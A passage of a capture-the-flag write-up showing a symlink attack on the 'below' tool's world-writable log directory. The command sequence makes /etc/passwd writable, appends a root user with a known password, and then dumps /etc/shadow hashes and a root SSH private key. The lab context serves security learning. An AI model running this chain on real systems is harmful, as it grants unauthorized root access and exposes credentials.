> Research - https://security.opensuse.org/2025/03/12/below-world-writable-log-dir.html#2-symlink-attack-in-varlogbelowerror_rootlog

![](/assets/obsidian/039cd5ba6d24c5c07b73779ae7659286.png)

There are error logs for separate users, and we can read/write to `root`'s error log file at `/var/log/below/error_root.log`, which validated that the version is vulnerable

```bash
jacob@outbound:~$ ls -latr /var/log/below
total 16
-rw-rw-rw-  1 jacob jacob   236 Jul  8 20:45 error_jacob.log
drwxr-xr-x  2 root  root   4096 Jul 15 00:00 store
drwxrwxr-x 13 root  syslog 4096 Jul 15 00:00 ..
-rw-rw-rw-  1 root  root      0 Jul 15 05:29 error_root.log
drwxrwxrwx  3 root  root   4096 Jul 15 05:29 .
```

We've created a **symlink** to `/etc/passwd` at `/var/log/below/error_root.log`

```bash
jacob@outbound:~$ ln -sf /etc/passwd /var/log/below/error_root.log
```

Triggered an error as `root` to write error logs to `/var/log/below/error_root.log`

```bash
jacob@outbound:~$ sudo below debug dump-store --time 1
Jul 15 05:33:35.589 WARN Expected file does not exist: /var/log/below/store/index_00000000000
Jul 15 05:33:35.593 ERRO
----------------- Detected unclean exit ---------------------
Error Message: Exact requested timestamp not found (would have used next datapoint)
-------------------------------------------------------------
```

The error logs were successfully written into `/etc/passwd`

```bash
jacob@outbound:~$ cat /etc/passwd | tail
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:999:988::/var/log/laurel:/bin/false
mel:x:1000:1000:,,,:/home/mel:/bin/bash
tyler:x:1001:1001:,,,:/home/tyler:/bin/bash
jacob:x:1002:1002:,,,:/home/jacob:/bin/bash
Jul 15 05:34:00.653 WARN Expected file does not exist: /var/log/below/store/index_00000000000
Jul 15 05:34:00.656 ERRO
----------------- Detected unclean exit ---------------------
Error Message: Exact requested timestamp not found (would have used next datapoint)
-------------------------------------------------------------
```

By doing so, **below** granted `rw` (read/write) permission to everyone on `/etc/passwd`

```bash
jacob@outbound:~$ ls -la /etc/passwd
-rw-rw-rw- 1 root root 1840 Jul 15 06:34 /etc/passwd
```

> This attack workflow should be automated since there's a heal check script that auto rollback the file system changes
> 
> ```bash
> ln -sf /etc/passwd /var/log/below/error_root.log; sudo below debug dump-store --time 1
> ```
{: .prompt-tip }

Now we can just add users with `root` permission to `/etc/passwd`

Generate user data

```bash
┌──(bravosec㉿fsociety)-[~/htb/Outbound]
└─$ HASH=$(openssl passwd -1 -salt ftpd 'Bravosec1337!'); echo "ftpd:${HASH}:0:0:root:/root:/bin/bash"
ftpd:$1$ftpd$wqR0M.yCMVUU0aYDQNKgP0:0:0:root:/root:/bin/bash
```

Write user data to `/etc/passwd` and switch user to `ftpd`

```bash
jacob@outbound:~$  echo 'ftpd:$1$ftpd$wqR0M.yCMVUU0aYDQNKgP0:0:0:root:/root:/bin/bash' >> /var/log/below/error_root.log; su - ftpd
Password:Bravosec1337!
root@outbound:~# id
uid=0(root) gid=0(root) groups=0(root)
root@outbound:~# cat root.txt
32c67df937ca994c68e4df0c81b769d2
```


# Additional
---

## Post exploitation


### Secrets

```bash
root@outbound:~# awk -F: '$2 ~ /^\$/' /etc/shadow
root:$y$j9T$pYysWAL0lX2oSXNpBeXs81$yinIBrOJnhJj7viI.GiorNEgZFyIewJbS3qnjgXth16:20247:0:99999:7:::
mel:$y$j9T$5lR6zOH0Y8G/9ZDhogu2o0$9..CpGSBi06uovpNhGjqaMhPkc3Yw/svG9T3bSBoeS2:20247:0:99999:7:::
tyler:$y$j9T$t1QDz.OaqfevjpnRfQrRY.$jJwx2.H.OkiHiW8T0f.3A1qS5ZfA7.nmwU3TE1otfb.:20247:0:99999:7:::
jacob:$y$j9T$5JYw1WIG1mlmMdj6BrGVV/$yimg6djeBwfHAaDiOPoU0le/aURm6fRaG.DXzBkmmmA:20247:0:99999:7:::
```


### Files

```bash
[+] /root/.ssh/id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAgJUUFNWb9cwZqGd7Eu+eg4fNO7rbWunuTsofUcm9v8AAAAJBG8i3vRvIt
7wAAAAtzc2gtZWQyNTUxOQAAACAgJUUFNWb9cwZqGd7Eu+eg4fNO7rbWunuTsofUcm9v8A
AAAEAK+Cbss+XhSwnuFg2UQGBoH2btqgdSle5APM+6Ff+4dCAlRQU1Zv1zBmoZ3sS756Dh
807utta6e5Oyh9Ryb2/wAAAADXJvb3RAb3V0Ym91bmQ=
-----END OPENSSH PRIVATE KEY-----
```


### Client side activities


#### Keylogging & Clipboard history

```bash

```


#### Browser

```bash

```


#### Files & directories access history

```bash

```


#### Application history

```bash

```